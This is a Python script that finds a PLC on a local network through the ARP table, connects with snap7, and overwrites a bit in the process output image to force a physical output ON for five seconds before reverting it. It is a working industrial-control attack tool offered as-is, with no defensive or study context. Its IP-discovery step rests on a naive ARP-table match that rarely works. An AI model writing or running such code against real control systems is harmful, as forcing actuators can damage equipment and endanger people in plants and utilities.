import snap7
import socket
import struct
import time
import logging

# Configure logging
logging.basicConfig(level=logging.INFO, format='%(asctime)s - %(levelname)s - %(message)s')

# Configuration
SWITCH_IP = "YOUR_SWITCH_IP" # Replace with the actual IP address of your switch
ENGINEERING_WORKSTATION_IP = "YOUR_ENGINEERING_WORKSTATION_IP" # Replace with the actual IP address of your engineering workstation
PLC_RACK = 0
PLC_SLOT = 1
TARGET_OUTPUT_ADDRESS = 0  # Example: Output Byte address
TARGET_OUTPUT_BIT = 0      # Example: Output Bit within the byte (0-7)
OVERRIDE_VALUE = True      # Value to force the output to (True = ON, False = OFF)
SLEEP_DURATION = 5        # Sleep duration to show the effect (seconds)

def find_plc_ip(switch_ip, workstation_ip):
    """
    Attempts to discover the PLC's IP address by examining ARP tables.
    Relies on the fact that the engineering workstation likely knows the PLC's IP.
    This is a very basic approach and might not work in all network configurations.
    It may require adjustments based on your network setup.

    Args:
        switch_ip:  The IP address of the network switch.  Used to constrain the search.
        workstation_ip: The IP address of the engineering workstation, assumed to communicate with the PLC.

    Returns:
        The PLC's IP address as a string, or None if not found.
    """

    try:
        # Use the 'arp' command (or a similar utility for your OS) to inspect the ARP table.
        # We filter for entries related to the switch and the workstation.
        # This example uses a simplified approach and may need adaptation for different OS.

        # WARNING: This is a simplified example and may require adaptation to your OS
        # and available tools for inspecting the ARP table.
        # Consider using a library like `netifaces` or `scapy` for more robust ARP table inspection.
        import subprocess

        # Example using 'arp -a' (common on Windows).  Adapt for Linux/macOS if needed.
        result = subprocess.run(['arp', '-a'], capture_output=True, text=True)
        arp_table = result.stdout.lower()

        logging.debug(f"ARP table: {arp_table}")

        # Search for an entry that involves both the workstation and the switch's IP
        #  This is based on the assumption that the PLC's IP will be associated with
        #  MAC addresses that are also associated with the workstation's IP in the ARP table.
        # This may require tweaking based on your specific network topology.
        plc_ip = None
        for line in arp_table.splitlines():
            if switch_ip.lower() in line and workstation_ip.lower() in line:
                parts = line.split()
                if len(parts) > 1:  # Check if there is a potential IP address
                    potential_ip = parts[1] # Usually the IP is the second column
                    try:
                        # Validate the potential IP
                        socket.inet_aton(potential_ip) # This will raise an exception if it's not a valid IP
                        logging.info(f"Potential PLC IP found: {potential_ip}")
                        plc_ip = potential_ip
                        break
                    except socket.error:
                        logging.debug(f"Skipping invalid IP address: {potential_ip}")


        if plc_ip:
            logging.info(f"PLC IP address found: {plc_ip}")
            return plc_ip
        else:
            logging.warning("PLC IP address not found in ARP table using simple search.  "
                            "Consider a more robust ARP table inspection method.")
            return None


    except Exception as e:
        logging.error(f"Error finding PLC IP address: {e}")
        return None


def manipulate_io_image(plc_ip, rack, slot, output_address, output_bit, override_value):
    """
    Manipulates the I/O image of a PLC to override an output.

    Args:
        plc_ip: The IP address of the PLC.
        rack: The PLC rack number.
        slot: The PLC slot number.
        output_address: The byte address of the output in the output image.
        output_bit: The bit within the byte to manipulate (0-7).
        override_value: True to force the output ON, False to force it OFF.
    """
    try:
        plc = snap7.client.Client()
        plc.set_timeout(2000,2000,2000,2000)  # increased timeout.  Adjust if necessary
        plc.connect(plc_ip, rack, slot)
        logging.info(f"Connected to PLC at {plc_ip}")

        # Read the current output byte
        output_area = snap7.types.Areas.PA  # Process Output Area
        size = 1  # Read one byte
        db_number = 0 # Not using a DB
        byte_value = plc.read_area(output_area, db_number, output_address, size)


        # Modify the specific bit within the byte
        original_byte = byte_value[0] # extract the byte
        if override_value:
            modified_byte = original_byte | (1 << output_bit)  # Set the bit
        else:
            modified_byte = original_byte & ~(1 << output_bit)  # Clear the bit

        # Write the modified byte back to the output image
        write_data = bytes([modified_byte])
        plc.write_area(output_area, db_number, output_address, write_data)
        logging.info(f"Output at address {output_address}, bit {output_bit} forced to {override_value}.")

        # Verify that the output value has changed
        # This is optional but helps confirm the success of the operation
        verify_byte = plc.read_area(output_area, db_number, output_address, size)

        if verify_byte[0] == modified_byte:
            logging.info(f"Verification successful: Output value changed to 0x{modified_byte:02x}")
        else:
            logging.warning(f"Verification failed: Output value is 0x{verify_byte[0]:02x}, expected 0x{modified_byte:02x}")



    except Exception as e:
        logging.error(f"Error manipulating I/O image: {e}")
    finally:
        if 'plc' in locals() and plc.get_connected():
            plc.disconnect()
            logging.info("Disconnected from PLC.")

if __name__ == "__main__":
    # 1. Find the PLC IP Address
    plc_ip = find_plc_ip(SWITCH_IP, ENGINEERING_WORKSTATION_IP)

    if plc_ip:
        # 2. Manipulate the I/O Image
        manipulate_io_image(plc_ip, PLC_RACK, PLC_SLOT, TARGET_OUTPUT_ADDRESS, TARGET_OUTPUT_BIT, OVERRIDE_VALUE)
        time.sleep(SLEEP_DURATION)  # Let the effect be visible
        manipulate_io_image(plc_ip, PLC_RACK, PLC_SLOT, TARGET_OUTPUT_ADDRESS, TARGET_OUTPUT_BIT, not OVERRIDE_VALUE) #Revert
    else:
        logging.error("PLC IP address not found.  Cannot proceed.")